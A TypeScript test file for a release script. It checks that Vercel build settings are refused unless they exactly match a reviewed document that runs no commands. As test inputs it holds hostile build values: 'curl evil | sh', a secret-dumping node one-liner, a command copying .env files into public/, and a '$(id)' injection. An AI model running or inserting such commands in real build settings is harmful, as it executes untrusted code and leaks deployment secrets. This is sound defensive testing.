/**
 * The Vercel project's build settings are executable input (Codex r5 F1): `vercel pull` writes them into
 * app/.vercel/project.json and the pinned CLI's build runs `settings.installCommand` and hands buildCommand,
 * outputDirectory, framework and nodeVersion to the builder, in a folder holding the pulled env files. The release
 * accepts only the reviewed document in ops/release-target.json (`vercelSettings`), and that document only if it runs
 * nothing of its own. These specs pin both halves and the stage rule (the pull may replace stale settings; nothing
 * after it may start on unreviewed ones).
 *
 *   npx mocha --import=tsx tests/release-deploy-vercel-settings.spec.ts
 */
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { execPinnedCli, preflight, releaseTargetRefusals, VERCEL_SETTINGS_KEYS } from "../ops/release-deploy.ts";
import { commitTarget, fakePinnedCli } from "./fake-pinned-cli.ts";
import { REVIEWED_SETTINGS } from "./reviewed-settings.ts";

const IDS = { vercelOrgId: "team_A", vercelProjectId: "prj_A" };

/** A checkout with a committed target and a link; returns the root. */
function checkout(target: object, settings: unknown): string {
  const root = mkdtempSync(join(tmpdir(), "release-settings-"));
  mkdirSync(join(root, "app", ".vercel"), { recursive: true });
  commitTarget(root, target);
  const link: Record<string, unknown> = { orgId: IDS.vercelOrgId, projectId: IDS.vercelProjectId };
  if (settings !== undefined) link.settings = settings;
  writeFileSync(join(root, "app", ".vercel", "project.json"), JSON.stringify(link));
  return root;
}
const refusals = (root: string, stage?: "before-pull" | "pulled") => releaseTargetRefusals(root, join(root, "app"), undefined, stage);

describe("the reviewed Vercel settings (Codex r5 F1)", () => {
  it("the committed document is the one the release accepts, and it runs nothing of its own", () => {
    assert.deepEqual(Object.keys(REVIEWED_SETTINGS).sort(), [...VERCEL_SETTINGS_KEYS].sort());
    assert.deepEqual(REVIEWED_SETTINGS, {
      framework: "nextjs", devCommand: null, installCommand: "", buildCommand: null, outputDirectory: null, rootDirectory: null,
      directoryListing: false, nodeVersion: "22.x",
    });
    assert.deepEqual(refusals(checkout({ ...IDS, vercelSettings: REVIEWED_SETTINGS }, REVIEWED_SETTINGS)), []);
  });

  it("a target without the document, or with one that runs or moves the build, is no reviewed target", () => {
    assert.match(refusals(checkout(IDS, REVIEWED_SETTINGS)).join(), /must name vercelSettings/);
    for (const [k, v] of [
      ["installCommand", "curl evil | sh"], ["installCommand", null], ["buildCommand", "node steal.js && next build"],
      ["devCommand", "x"], ["outputDirectory", "public"], ["rootDirectory", "app"], ["framework", "other"], ["directoryListing", true],
      ["nodeVersion", "22"], ["nodeVersion", "$(id).x"],
    ] as const) {
      const bad = { ...REVIEWED_SETTINGS, [k]: v };
      const r = refusals(checkout({ ...IDS, vercelSettings: bad }, bad));
      assert.match(r.join(), new RegExp(`vercelSettings\\.${k}`), `${k}=${JSON.stringify(v)} is refused in the committed document`);
      // and before the pull too: the document itself is checked at every stage
      assert.match(refusals(checkout({ ...IDS, vercelSettings: bad }, undefined), "before-pull").join(), new RegExp(`vercelSettings\\.${k}`));
    }
    const extra = { ...REVIEWED_SETTINGS, monorepoManager: "turbo" };
    assert.match(refusals(checkout({ ...IDS, vercelSettings: extra }, REVIEWED_SETTINGS)).join(), /vercelSettings\.monorepoManager is not a build setting/);
    const missing: Record<string, unknown> = { ...REVIEWED_SETTINGS };
    delete missing.installCommand;
    assert.match(refusals(checkout({ ...IDS, vercelSettings: missing }, REVIEWED_SETTINGS)).join(), /vercelSettings\.installCommand must be ""/);
  });

  it("after the pull, the link's settings must be exactly the reviewed document", () => {
    const target = { ...IDS, vercelSettings: REVIEWED_SETTINGS };
    for (const [k, v] of [
      ["installCommand", "node -e \"require('fs').writeFileSync('x', process.env.SWAP_BINDING_SECRET)\""], ["installCommand", null],
      ["buildCommand", "pnpm run build && cp .vercel/.env.preview.local public/"], ["outputDirectory", "out"], ["devCommand", "next dev"],
      ["framework", null], ["nodeVersion", "20.x"], ["directoryListing", true], ["rootDirectory", "."],
    ] as const) {
      const r = refusals(checkout(target, { ...REVIEWED_SETTINGS, [k]: v }));
      assert.match(r.join(), new RegExp(`settings\\.${k} is ${JSON.stringify(v).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}, not the reviewed`), `${k}=${JSON.stringify(v)}`);
    }
    // keys the pinned CLI's build reads but its pull never writes, and Web Analytics' id, are refused
    assert.match(refusals(checkout(target, { ...REVIEWED_SETTINGS, monorepoManager: "turbo" })).join(), /settings\.monorepoManager is not a reviewed build setting/);
    assert.match(refusals(checkout(target, { ...REVIEWED_SETTINGS, analyticsId: "abc" })).join(), /analyticsId: Web Analytics is on/);
    assert.match(refusals(checkout(target, { ...REVIEWED_SETTINGS, createdAt: "today" })).join(), /createdAt is "today", not a date/);
    // no settings at all: the build would fetch its own
    assert.match(refusals(checkout(target, undefined)).join(), /holds no build settings/);
    // what the pull writes for an unset override is null, or nothing: both are the reviewed null; createdAt is a date
    const unsetLeftOut: Record<string, unknown> = { ...REVIEWED_SETTINGS, createdAt: 1759300000000 };
    for (const k of ["devCommand", "buildCommand", "outputDirectory", "rootDirectory"]) delete unsetLeftOut[k];
    assert.deepEqual(refusals(checkout(target, unsetLeftOut)), []);
    // but a left-out install command is the CLI's own install, not the reviewed "skip": refused
    const noInstall: Record<string, unknown> = { ...REVIEWED_SETTINGS };
    delete noInstall.installCommand;
    assert.match(refusals(checkout(target, noInstall)).join(), /settings\.installCommand is undefined, not the reviewed ""/);
  });

  it("before the pull a stale link's settings are not judged (the pull replaces them); the build never starts on them", () => {
    const target = { ...IDS, vercelSettings: REVIEWED_SETTINGS };
    const sentinel = "touch /tmp/should-never-run";
    const root = checkout(target, { ...REVIEWED_SETTINGS, installCommand: sentinel });
    assert.deepEqual(preflight(root, undefined, "before-pull").filter((f) => /settings/.test(f)), []);
    const started: string[][] = [];
    const spawn = (_c: string, a: string[]) => { started.push(a); return 0; };
    // the pull may run: it only writes the settings
    assert.equal(execPinnedCli(fakePinnedCli(), ["pull", "--yes", "--environment=preview"], root, spawn), 0);
    assert.equal(started.length, 1);
    // the build is refused before the CLI starts, in both modes, naming the setting
    for (const args of [["build", "--yes"], ["build", "--yes", "--prod"]]) {
      assert.throws(() => execPinnedCli(fakePinnedCli(), args, root, spawn), /REFUSED before the CLI started[\s\S]*settings\.installCommand is "touch \/tmp\/should-never-run", not the reviewed ""/);
    }
    assert.equal(started.length, 1, "the build runner never started");
    // and the scan's preflight refuses them as well
    assert.match(preflight(root).join(), /settings\.installCommand/);
  });
});
